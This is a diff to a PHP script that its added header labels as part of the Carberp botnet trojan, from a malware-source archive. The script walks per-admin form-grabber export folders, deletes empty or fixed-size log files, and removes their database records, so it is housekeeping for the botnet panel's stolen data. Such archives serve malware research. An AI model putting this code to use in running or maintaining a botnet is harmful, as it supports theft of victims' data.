@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 error_reporting(-1);
@@ -5,7 +16,8 @@ ini_set('max_execution_time', 0);
 $dir = realpath('.');
 $adm = $mysqli->query('SELECT id FROM bf_admins');
 
-foreach($adm as $a){	$file = scandir($dir . '/logs/' . $a->id . '/export/fgr/');
+foreach($adm as $a){
+	$file = scandir($dir . '/logs/' . $a->id . '/export/fgr/');
     unset($file[0], $file[1]);
 	foreach($file as $f){
 		$fi = $dir . '/logs/' . $a->id . '/export/fgr/' . $f;
@@ -18,7 +30,8 @@ foreach($adm as $a){	$file = scandir($dir . '/logs/' . $a->id . '/export/fgr/')
 
 		if(file_exists($fi)){
 			$fs = filesize($fi);
-			if($fs == 856 || $fs === 0){				echo $fi . "<br>";
+			if($fs == 856 || $fs === 0){
+				echo $fi . "<br>";
 				unlink($fi);
 				$mysqli->query('delete from bf_files where (id = \''.$q->id.'\')');
 			}
